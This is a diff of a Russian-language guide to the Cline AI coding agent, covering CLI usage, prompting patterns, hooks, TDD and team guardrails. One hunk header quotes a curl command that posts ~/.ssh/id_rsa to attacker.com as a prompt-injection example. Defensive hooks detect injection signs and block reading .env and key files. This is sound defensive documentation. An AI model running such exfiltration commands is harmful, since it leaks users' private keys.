@@ -418,7 +418,7 @@ Basic Compaction — rule-based усечение с приоритетами. А
 
 | Категория | Инструменты |
 |-----------|-------------|
-| Файловая система | read_file, write_to_file, apply_diff, list_files |
+| Файловая система | read_file, write_to_file, replace_in_file, list_files |
 | Поиск | search_files, list_code_definition_names |
 | Терминал | execute_command (bash) |
 | Браузер | browser_action |
@@ -1154,11 +1154,14 @@ git diff | cline --thinking high "review for security issues"
 **Plan Mode как встроенный CoT.** Самый мощный CoT-паттерн в Cline — это переключение в Plan Mode перед действием. В Plan Mode Cline читает кодовую базу, задаёт уточняющие вопросы и строит план — не трогая ни одного файла. Это не просто «думать вслух», это думать с доступом к реальному контексту:
 
 ```bash
-# Plan Mode в CLI — спроектировать без изменений
-cline -p "design the migration plan for adding multi-tenancy"
+# Вариант 1: Интерактивный режим (рекомендуется)
+cline -i "design the migration plan for adding multi-tenancy"
+# После завершения планирования переключитесь в Act mode в TUI
 
-# Потом выполнить с полным контекстом плана
-cline "implement the multi-tenancy migration"
+# Вариант 2: Возобновление сессии по ID
+cline -p "design the migration plan for adding multi-tenancy"
+# Запомните ID сессии из вывода
+cline --id <session-id> "implement the multi-tenancy migration"
 ```
 
 ---
@@ -1200,7 +1203,6 @@ test(user): add edge cases for email validation
 ---
 
 ### 1.18.3. ReAct — рассуждение плюс действие
-
 Чередуйте мышление с действиями. Модель рассуждает, действует, наблюдает результат, повторяет.
 
 Cline реализует ReAct нативно через Plan Mode и Act Mode. Это не метафора — это буквально тот же паттерн:
@@ -1221,17 +1223,12 @@ Plan Mode:
 Act Mode:
   Реализация по плану
 ```
-
 Ключевое свойство ReAct — отлаживаемость. Вы видите, почему Cline принял каждое решение. Если что-то пошло не так, вы видите, где именно сломалась цепочка рассуждений.
 
-Для агентных сценариев в CLI используйте `use_subagents` — параллельный ReAct для широкого исследования:
+Для агентных сценариев в CLI Cline может использовать use_subagents — параллельный ReAct для широкого исследования. Агент сам решает, когда вызывать этот tool:
 
-```bash
-cline "Investigate the performance regression in the API:
-  - subagent 1: analyze recent commits touching the query layer
-  - subagent 2: check if indexes were changed in migrations
-  - subagent 3: look for N+1 patterns in the affected endpoints
-  Synthesize findings and propose a fix."
+```
+cline "Investigate the performance regression in the API. Analyze recent commits touching the query layer, check if indexes were changed in migrations, and look for N+1 patterns in the affected endpoints. Then synthesize findings and propose a fix."
 ```
 
 ---
@@ -1275,10 +1272,9 @@ echo "$PLAN" | cline --config ~/.cline-sonnet \
 ---
 
 ### 1.18.5. Role Prompting — ролевые промпты
-
 Дайте модели персону. Меняет тон, уровень экспертизы и стиль ответов.
 
-В Cline роль задаётся через `.clinerules`. Это не просто «системный промпт» — это постоянные инструкции, которые применяются ко всем задачам в проекте:
+В Cline роль задаётся через .clinerules. Это не просто «системный промпт» — это постоянные инструкции, которые применяются ко всем задачам в проекте:
 
 ```
 # .clinerules/persona.md
@@ -1295,8 +1291,7 @@ echo "$PLAN" | cline --config ~/.cline-sonnet \
 Когда ревьюишь код — будь скептичным. Ищи то, что сломается
 под нагрузкой, а не то, что выглядит красиво.
 ```
-
-**Эффективные роли для разных задач:**
+Эффективные роли для разных задач:
 
 | Роль | Эффект |
 |------|--------|
@@ -1305,14 +1300,15 @@ echo "$PLAN" | cline --config ~/.cline-sonnet \
 | "You are a teacher explaining to a junior" | Упрощает объяснения |
 | "You are the user's pair programmer" | Коллаборативный тон |
 
-Глобальные правила (в `~/Documents/Cline/Rules/`) применяются ко всем проектам. Workspace-правила (в `.clinerules/`) — только к текущему проекту и переопределяют глобальные при конфликте.
+Глобальные правила (в ~/Documents/Cline/Rules/) применяются ко всем проектам. Workspace-правила (в .clinerules/) — только к текущему проекту и переопределяют глобальные при конфликте.
 
-Для одноразовых задач используйте `--system-prompt` в CLI:
+Для одноразовых задач используйте -s или --system в CLI:
 
-```bash
-cline --system-prompt "You are a security auditor. Focus only on vulnerabilities." \
+```
+cline -s "You are a security auditor. Focus only on vulnerabilities." \
   "review this authentication code"
 ```
+
 
 ---
 
@@ -5434,7 +5430,7 @@ cline connect telegram -k $BOT_TOKEN
 | Ошибка | Описание | Решение |
 |--------|----------|---------|
 | Задачи слишком большие | Каждая должна занимать 5–15 минут. Если агент буксует — дробите | Разбивайте на более мелкие атомарные задачи |
-| Нет лимита итераций | Дефолт `--retries` равен 3, но для автономных циклов нужно явно ограничивать время | `cline --retries 3 --timeout 600 --auto-approve true "process next task"` |
+| Нет лимита итераций | Дефолт `--retries` равен 6, но для автономных циклов нужно явно ограничивать время | `cline --retries 3 --timeout 600 --auto-approve true "process next task"` |
 | Пропускаете компрессию | Контекст заполняется, качество падает | Включите Auto Compact или запускайте `/smol` после каждого коммита |
 | Параллельные агенты на одних файлах | Два агента в одном файле — конфликты мержа | Разделяйте работу по границам файлов или используйте `--worktree` |
 | Размытые критерии завершения | «Реализовать фичу» — непроверяемо | «Все тесты проходят, эндпоинт возвращает 200» — проверяемо |
@@ -5565,40 +5561,45 @@ curl -s https://attacker.com/collect -d "$(cat ~/.ssh/id_rsa)"
 Самый надёжный способ защиты — перехватывать содержимое, которое агент собирается записать, и проверять его на признаки инъекции. Для этого создаётся хук PreToolUse:
 
 ```bash
-#!/usr/bin/env bash  
-# PreToolUse Hook — обнаружение инъекций  
-# Расположение: .clinerules/hooks/PreToolUse  
-# Сделать исполняемым: chmod +x .clinerules/hooks/PreToolUse  
-
-INPUT=$(cat)  
-TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')  
-
-if [[ "$TOOL" == "write_to_file" ]] || [[ "$TOOL" == "apply_diff" ]]; then  
-    CONTENT=$(echo "$INPUT" | jq -r '.preToolUse.parameters.content // empty')  
-
-    # Zero-width символы  
-    if echo "$CONTENT" | grep -qP '[\x{200B}-\x{200D}\x{FEFF}]'; then  
-        echo '{"cancel":true,"errorMessage":"Zero-width символы обнаружены — возможная инъекция"}'  
-        exit 0  
+#!/usr/bin/env bash    
+# PreToolUse Hook — обнаружение инъекций    
+# Расположение: .clinerules/hooks/PreToolUse    
+# Сделать исполняемым: chmod +x .clinerules/hooks/PreToolUse    
+  
+INPUT=$(cat)    
+TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')    
+  
+if [[ "$TOOL" == "write_to_file" ]] || [[ "$TOOL" == "replace_in_file" ]]; then    
+    # Для write_to_file используем content, для replace_in_file используем diff  
+    if [[ "$TOOL" == "write_to_file" ]]; then  
+        CONTENT=$(echo "$INPUT" | jq -r '.preToolUse.parameters.content // empty')  
+    else  
+        CONTENT=$(echo "$INPUT" | jq -r '.preToolUse.parameters.diff // empty')  
     fi  
-
-    # Base64 в комментариях (высокая энтропия)  
-    if echo "$CONTENT" | grep -qE '[#;].*[A-Za-z0-9+/]{20,}={0,2}'; then  
-        echo '{"cancel":true,"errorMessage":"Base64 в комментарии — возможная инъекция"}'  
-        exit 0  
-    fi  
-
-    # Вложенные команды  
-    if echo "$CONTENT" | grep -qE '\$\([^)]+\)|\`[^\`]+\`'; then  
-        echo '{"cancel":true,"errorMessage":"Вложенная команда в контенте"}'  
-        exit 0  
-    fi  
-fi  
-
+  
+    # Zero-width символы    
+    if echo "$CONTENT" | grep -qP '[\x{200B}-\x{200D}\x{FEFF}]'; then    
+        echo '{"cancel":true,"errorMessage":"Zero-width символы обнаружены — возможная инъекция"}'    
+        exit 0    
+    fi    
+  
+    # Base64 в комментариях (высокая энтропия)    
+    if echo "$CONTENT" | grep -qE '[#;].*[A-Za-z0-9+/]{20,}={0,2}'; then    
+        echo '{"cancel":true,"errorMessage":"Base64 в комментарии — возможная инъекция"}'    
+        exit 0    
+    fi    
+  
+    # Вложенные команды    
+    if echo "$CONTENT" | grep -qE '\$\([^)]+\)|\`[^\`]+\`'; then    
+        echo '{"cancel":true,"errorMessage":"Вложенная команда в контенте"}'    
+        exit 0    
+    fi    
+fi    
+  
 echo '{"cancel":false}'
 ```
 
-Важно: Хуки нужно включить в настройках Cline: Settings → Feature Settings → Enable Hooks. Хук должен быть исполняемым (chmod +x). README.md:51-62
+Важно: Хуки нужно включить в настройках Cline: Settings → Feature Settings → Enable Hooks. Хук должен быть исполняемым (chmod +x).
 
 ### Защита: аудит репозитория перед открытием
 
@@ -5750,40 +5751,40 @@ export CLINE_COMMAND_PERMISSIONS='{
 
 Правила: deny переопределяет allow. Если задан allow — команды, не совпадающие с паттернами, блокируются. allowRedirects контролирует shell-редиректы (>, >>, <), дефолт false.
 
-Примечание: CLINE_COMMAND_PERMISSIONS работает только в CLI. В VS Code/JetBrains используйте хуки PreToolUse для аналогичной блокировки. config.mdx:126-149
+Примечание: CLINE_COMMAND_PERMISSIONS работает только в CLI. В VS Code/JetBrains используйте хуки PreToolUse для аналогичной блокировки.
 
 ### Защита: хук блокировки опасных команд
 
 ```bash
-#!/usr/bin/env bash  
-# PreToolUse Hook — блокировка опасных команд  
-# Расположение: ~/Documents/Cline/Hooks/PreToolUse (глобальный, VS Code)  
-# или ~/.cline/hooks/PreToolUse (глобальный, CLI)  
-
-INPUT=$(cat)  
-TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')  
-COMMAND=$(echo "$INPUT" | jq -r '.preToolUse.parameters.command // empty')  
-
-if [[ "$TOOL" == "execute_command" ]]; then  
-    # Блокировка чтения секретов  
-    if echo "$COMMAND" | grep -qE '(cat|head|tail|grep)\s+.*\.env'; then  
-        echo '{"cancel":true,"errorMessage":"Блокировка: чтение .env файлов запрещено"}'  
-        exit 0  
-    fi  
-
-    # Блокировка чтения ключей  
-    if echo "$COMMAND" | grep -qE '(cat|head)\s+.*\.(pem|key|p12|pfx)'; then  
-        echo '{"cancel":true,"errorMessage":"Блокировка: чтение ключевых файлов запрещено"}'  
-        exit 0  
-    fi  
-
-    # Блокировка printenv/env  
-    if echo "$COMMAND" | grep -qE '^(printenv|env)(\s|$)'; then  
-        echo '{"cancel":true,"errorMessage":"Блокировка: вывод переменных окружения запрещён"}'  
-        exit 0  
-    fi  
-fi  
-
+#!/usr/bin/env bash    
+# PreToolUse Hook — блокировка опасных команд    
+# Расположение: ~/Documents/Cline/Hooks/PreToolUse (глобальный)    
+# или .clinerules/hooks/PreToolUse (workspace)    
+  
+INPUT=$(cat)    
+TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')    
+COMMAND=$(echo "$INPUT" | jq -r '.preToolUse.parameters.command // empty')    
+  
+if [[ "$TOOL" == "execute_command" ]]; then    
+    # Блокировка чтения секретов    
+    if echo "$COMMAND" | grep -qE '(cat|head|tail|grep)\s+.*\.env'; then    
+        echo '{"cancel":true,"errorMessage":"Блокировка: чтение .env файлов запрещено"}'    
+        exit 0    
+    fi    
+  
+    # Блокировка чтения ключей    
+    if echo "$COMMAND" | grep -qE '(cat|head)\s+.*\.(pem|key|p12|pfx)'; then    
+        echo '{"cancel":true,"errorMessage":"Блокировка: чтение ключевых файлов запрещено"}'    
+        exit 0    
+    fi    
+  
+    # Блокировка printenv/env    
+    if echo "$COMMAND" | grep -qE '^(printenv|env)(\s|$)'; then    
+        echo '{"cancel":true,"errorMessage":"Блокировка: вывод переменных окружения запрещён"}'    
+        exit 0    
+    fi    
+fi    
+  
 echo '{"cancel":false}'
 ```
 
@@ -5952,8 +5953,6 @@ const agent = new Agent({
 })
 ```
 
-permission-handling.mdx:71-73
-
 ### Checkpoints — rollback без изоляции
 
 Если devcontainer недоступен, Checkpoints дают возможность откатить изменения (Restore Files, Restore Task Only, Restore Files & Task). Детали — в главе 11 (раздел 11.4). Это не замена изоляции, но снижает стоимость ошибки.
@@ -6008,7 +6007,7 @@ permission-handling.mdx:71-73
 .clinerules/hooks/PreToolUse          ← обнаружение инъекций  
 ```
 
-Включить хуки в VS Code: Settings → Feature Settings → Enable Hooks. README.md:301-313 cli-reference.mdx:40-41
+Включить хуки в VS Code: Settings → Feature Settings → Enable Hooks.
 
 ### Velocity Governor — ограничитель скорости агента
 
@@ -6049,7 +6048,7 @@ fi
 echo '{"cancel":false}'
 ```
 
-Исправление относительно предыдущей версии: taskId доступен только через входной JSON (jq -r '.taskId'), а не как переменная окружения $TASK_ID. Хук также должен проверять $TOOL перед записью в счётчик, чтобы считать только execute_command, а не все вызовы инструментов. README.md:136-196
+Исправление относительно предыдущей версии: taskId доступен только через входной JSON (jq -r '.taskId'), а не как переменная окружения $TASK_ID. Хук также должен проверять $TOOL перед записью в счётчик, чтобы считать только execute_command, а не все вызовы инструментов.
 
 ### Автоматизированный аудит конфигурации
 
@@ -6231,13 +6230,13 @@ cline mcp
 
 **Проблема: агент нарушает TDD по умолчанию.** Без явной инструкции AI-агент всегда делает одно и то же: пишет реализацию, а затем тесты, которые проходят против этой реализации. Это не TDD. Тесты, написанные после реализации, проверяют то, что уже написано, а не то, что должно быть написано. Они не управляют дизайном — они просто подтверждают то, что уже сделано, и не смогут обнаружить регрессии в будущем.
 
-❌ Поведение агента по умолчанию:  
+Поведение агента по умолчанию:  
    "Реализуй функцию X с тестами"  
    → Агент пишет реализацию  
    → Агент пишет тесты, которые проходят  
    → Тесты не обнаружат регрессии в будущем  
 
-✅ TDD с явным промптом:  
+TDD с явным промптом:  
    "Напиши ПАДАЮЩИЕ тесты для X. НЕ пиши реализацию."  
    → Агент пишет тесты (они падают)  
    → "Теперь напиши минимальный код для прохождения тестов"  
@@ -6323,23 +6322,23 @@ npm test
 
 ### Автоматический запуск тестов через хуки
 
-Хук PostToolUse запускает тесты после каждого редактирования. Создайте файл `.clinerules/hooks/PostToolUse` (или `~/.ai-agent/hooks/PostToolUse` для глобального применения):
+Хук PostToolUse запускает тесты после каждого редактирования. Создайте файл `.clinerules/hooks/PostToolUse` (или `~/Documents/Cline/Hooks/PostToolUse` для глобального применения):
 
 ```bash
-#!/usr/bin/env bash
-input=$(cat)
-tool_name=$(echo "$input" | jq -r '.postToolUse.toolName')
-success=$(echo "$input" | jq -r '.postToolUse.success')
-
-# Запускать тесты после редактирования файлов
-if [[ "$tool_name" == "write_to_file" || \
-      "$tool_name" == "apply_diff"    || \
-      "$tool_name" == "replace_in_file" ]] && \
-   [[ "$success" == "true" ]]; then
-  test_output=$(npm test --watchAll=false 2>&1 | tail -20)
-  echo "{\"cancel\": false, \"contextModification\": \"Test results after edit:\n$test_output\"}"
-else
-  echo '{"cancel": false}'
+#!/usr/bin/env bash  
+input=$(cat)  
+tool_name=$(echo "$input" | jq -r '.postToolUse.toolName')  
+success=$(echo "$input" | jq -r '.postToolUse.success')  
+  
+# Запускать тесты после редактирования файлов  
+if [[ "$tool_name" == "write_to_file" || \  
+      "$tool_name" == "apply_diff"    || \  
+      "$tool_name" == "replace_in_file" ]] && \  
+   [[ "$success" == "true" ]]; then  
+  test_output=$(npm test --watchAll=false 2>&1 | tail -20)  
+  echo "{\"cancel\": false, \"contextModification\": \"Test results after edit:\n$test_output\"}"  
+else  
+  echo '{"cancel": false}'  
 fi
 ```
 
@@ -6480,10 +6479,10 @@ SDD: Спецификация → Промпт → Код → Верификац
 
 Задача, провалившая 2+ измерения, требует доработки до передачи агенту.
 
-❌ Слишком широко, неоднозначно:  
+Слишком широко, неоднозначно:  
    «Добавь аутентификацию пользователей в приложение»  
 
-✅ Один вертикальный срез:  
+Один вертикальный срез:  
    «Пользователи могут войти с email + паролем.  
    - POST /auth/login возвращает JWT при успехе, 401 при ошибке  
    - Неверные данные показывают 'Email или пароль неверны' (не уточнять, что именно)  
@@ -6712,20 +6711,19 @@ Gherkin-сценарий — это контракт между намерени
 Создайте `.clinerules/hooks/PostToolUse`:
 
 ```bash
-#!/usr/bin/env bash
-# PostToolUse: запускать Cucumber после изменений файлов
-input=$(cat)
-tool_name=$(echo "$input" | jq -r '.postToolUse.toolName')
-success=$(echo "$input" | jq -r '.postToolUse.success')
-
-if [[ "$tool_name" == "write_to_file"   || \
-      "$tool_name" == "apply_diff"       || \
-      "$tool_name" == "replace_in_file" ]] && \
-   [[ "$success" == "true" ]]; then
-  cucumber_output=$(npx cucumber-js --format progress 2>&1 | tail -20)
-  echo "{\"cancel\": false, \"contextModification\": \"Cucumber results:\n$cucumber_output\"}"
-else
-  echo '{"cancel": false}'
+#!/usr/bin/env bash  
+# PostToolUse: запускать Cucumber после изменений файлов  
+input=$(cat)  
+tool_name=$(echo "$input" | jq -r '.postToolUse.toolName')  
+success=$(echo "$input" | jq -r '.postToolUse.success')  
+  
+if [[ "$tool_name" == "write_to_file"   || \  
+      "$tool_name" == "replace_in_file" ]] && \  
+   [[ "$success" == "true" ]]; then  
+  cucumber_output=$(npx cucumber-js --format progress 2>&1 | tail -20)  
+  echo "{\"cancel\": false, \"contextModification\": \"Cucumber results:\n$cucumber_output\"}"  
+else  
+  echo '{"cancel": false}'  
 fi
 ```
 
@@ -6953,8 +6951,8 @@ EOF
 
 **Настройка (30 минут)**
 
-- Установить Cline: npm install -g cline [[sdk/apps/cli/README.md:36-38]]
-- Настроить глобальные правила: добавить в ~/Documents/Cline/Rules/ [[docs/customization/cline-rules.mdx:56-62]]
+- Установить Cline: npm install -g cline
+- Настроить глобальные правила: добавить в ~/Documents/Cline/Rules/
 - Проверить загрузку конфигурации проекта: спросить агента "Какой тир у этого проекта?"
 - Прочитать AI Usage Charter (ссылка на ваш документ)
 - Изучить список одобренных MCP: .cline/mcp.json
@@ -7188,23 +7186,36 @@ Session Logger для аудит-трейла
 ### Скрипт автоматической настройки проекта
 
 ```bash
-#!/bin/bash
-# scripts/setup-project.sh
-# Использование: ./setup-project.sh [starter|standard|strict|regulated]
-
-TIER=${1:-standard}
-CONFIG_REPO="https://github.com/your-org/cline-config"
-
-echo "Настройка регламентации Cline: тир $TIER"
-
-mkdir -p .cline/hooks
-
-# Скопировать конфигурацию тира
-curl -s "$CONFIG_REPO/raw/main/templates/.cline/config.${TIER}.json" \
-  -o .cline/config.json
-
-# Скопировать шаблон правил
-curl -s "$CONFIG_REPO/raw/main"
+#!/bin/bash  
+# scripts/setup-project.sh  
+# Использование: ./setup-project.sh [starter|standard|strict|regulated]  
+  
+TIER=${1:-standard}  
+CONFIG_REPO="https://github.com/your-org/cline-config"  
+  
+echo "Настройка регламентации Cline: тир $TIER"  
+  
+# Создать структуру директорий .cline  
+mkdir -p .cline/rules  
+mkdir -p .cline/skills  
+mkdir -p .cline/hooks  
+mkdir -p .cline/agents  
+  
+# Скопировать правила для тира  
+curl -s "$CONFIG_REPO/raw/main/templates/.cline/rules/${TIER}.md" \  
+  -o .cline/rules/${TIER}.md  
+  
+# Скопировать hooks для тира  
+curl -s "$CONFIG_REPO/raw/main/templates/.cline/hooks/${TIER}.sh" \  
+  -o .cline/hooks/PreToolUse  
+chmod +x .cline/hooks/PreToolUse  
+  
+# Скопировать skills для тира (опционально)  
+curl -s "$CONFIG_REPO/raw/main/templates/.cline/skills/${TIER}/SKILL.md" \  
+  -o .cline/skills/${TIER}/SKILL.md  
+  
+echo "Настройка завершена для тира: $TIER"
+```
 
 ## Практические выводы
 
@@ -7214,7 +7225,7 @@ curl -s "$CONFIG_REPO/raw/main"
 - **Guardrail Tiers — не всем проектам нужен одинаковый уровень контроля.** Starter для малых команд, Standard для большинства, Strict для production-критичных систем, Regulated для HIPAA/SOC2/PCI. Начните со Standard, ужесточайте по мере необходимости.
 - **Онбординг нового разработчика — 30 минут,** которые окупаются за первую неделю. Без него каждый настраивает агента по-своему, создавая регламентный разрыв, который потом невозможно закрыть без полной переконфигурации.
 - **Внедрение в командах 50+ требует фазового подхода.** Фундамент (недели 1–2) → Внедрение (недели 3–6) → Оптимизация (месяцы 2–3). Попытка развернуть Strict-тир везде в первый день гарантирует сопротивление и обходные пути.
-```
+
 
 
 # Глава 11. Отладка и диагностика (Debugging and Diagnostics)
@@ -7515,32 +7526,32 @@ cline --retries 5 "сложная задача"
 **1. Harness-enforced ограничения вместо advisory промптов**
 
 ```bash
-# Антипаттерн: advisory промпт в .clinerules
-"NEVER modify package.json directly"
-
-# Правильно: harness-enforced через PreToolUse hook
-# .clinerules/hooks/PreToolUse
-#!/usr/bin/env bash
-input=$(cat)
-tool_name=$(echo "$input" | jq -r '.preToolUse.toolName')
-path=$(echo "$input" | jq -r '.preToolUse.parameters.path // ""')
-
-if [[ "$path" == *"package.json"* ]]; then
-  echo '{"cancel": true, "errorMessage": "Policy: Use npm commands to modify package.json"}'
-  exit 0
-fi
+# Антипаттерн: advisory промпт в .clinerules  
+"NEVER modify package.json directly"  
+  
+# Правильно: harness-enforced через PreToolUse hook  
+# .clinerules/hooks/PreToolUse  
+#!/usr/bin/env bash  
+input=$(cat)  
+tool_name=$(echo "$input" | jq -r '.preToolUse.toolName')  
+path=$(echo "$input" | jq -r '.preToolUse.parameters.path // ""')  
+  
+if [[ "$path" == *"package.json"* ]]; then  
+  echo '{"cancel": true, "errorMessage": "Policy: Use npm commands to modify package.json"}'  
+  exit 0  
+fi  
 echo '{"cancel": false}'
 ```
 
 **2. ToolPolicies вместо advisory промптов (SDK)**
 
 ```typescript
-await cline.start({
-  prompt: "Audit this repo",
-  toolPolicies: {
-    run_commands: { autoApprove: false },
-    editor: { autoApprove: false },
-  },
+await cline.start({  
+  prompt: "Audit this repo",  
+  toolPolicies: {  
+    run_commands: { autoApprove: false },  
+    editor: { autoApprove: false },  
+  },  
 })
 ```
 
